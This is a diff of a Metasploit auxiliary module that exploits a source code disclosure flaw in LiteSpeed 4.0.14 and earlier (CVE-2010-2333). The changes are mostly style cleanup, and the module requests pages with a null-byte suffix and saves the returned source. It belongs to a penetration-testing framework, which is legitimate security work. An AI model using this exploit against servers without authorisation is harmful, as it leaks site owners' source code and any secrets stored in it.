@@ -1,42 +1,38 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
   def initialize
     super(
-      'Name'           => 'LiteSpeed Source Code Disclosure/Download',
-      'Description'    => %q{
+      'Name' => 'LiteSpeed Source Code Disclosure/Download',
+      'Description' => %q{
           This module exploits a source code disclosure/download vulnerability in
         versions 4.0.14 and prior of LiteSpeed.
       },
-      'References'     =>
-        [
-          [ 'CVE', '2010-2333' ],
-          [ 'OSVDB', '65476' ],
-          [ 'BID', '40815' ],
-          [ 'EDB', '13850' ]
-        ],
-      'Author'         =>
-        [
-          'Kingcope',  # initial disclosure
-          'xanda'      # Metasploit module
-        ],
-      'License'        =>  MSF_LICENSE)
+      'References' => [
+        [ 'CVE', '2010-2333' ],
+        [ 'OSVDB', '65476' ],
+        [ 'BID', '40815' ],
+        [ 'EDB', '13850' ]
+      ],
+      'Author' => [
+        'Kingcope', # initial disclosure
+        'xanda' # Metasploit module
+      ],
+      'License' => MSF_LICENSE)
 
     register_options(
       [
         OptString.new('URI', [true, 'Specify the path to download the file (ex: admin.php)', '/admin.php']),
         OptString.new('PATH_SAVE', [true, 'The path to save the downloaded source code', '']),
-      ], self.class)
+      ]
+    )
   end
 
   def target_url
@@ -56,8 +52,8 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_raw({
-        'method'  => 'GET',
-        'uri'     => "#{uri}#{nullbytetxt}",
+        'method' => 'GET',
+        'uri' => "#{uri}#{nullbytetxt}",
       }, 25)
 
       if res.nil?
@@ -74,7 +70,7 @@ class MetasploitModule < Msf::Auxiliary
 
           print_good("#{target_url} - LiteSpeed - Getting the source of page #{uri}")
           p = store_loot("litespeed.source", "text/plain", rhost, res.body, path_save)
-          print_status("#{target_url} - LiteSpeed - File successfully saved: #{p}")
+          print_good("#{target_url} - LiteSpeed - File successfully saved: #{p}")
 
         else
           print_error("http://#{vhost}:#{rport} - LiteSpeed - Unrecognized #{res.code} response")
@@ -91,10 +87,8 @@ class MetasploitModule < Msf::Auxiliary
         return
 
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
   end
-
 end
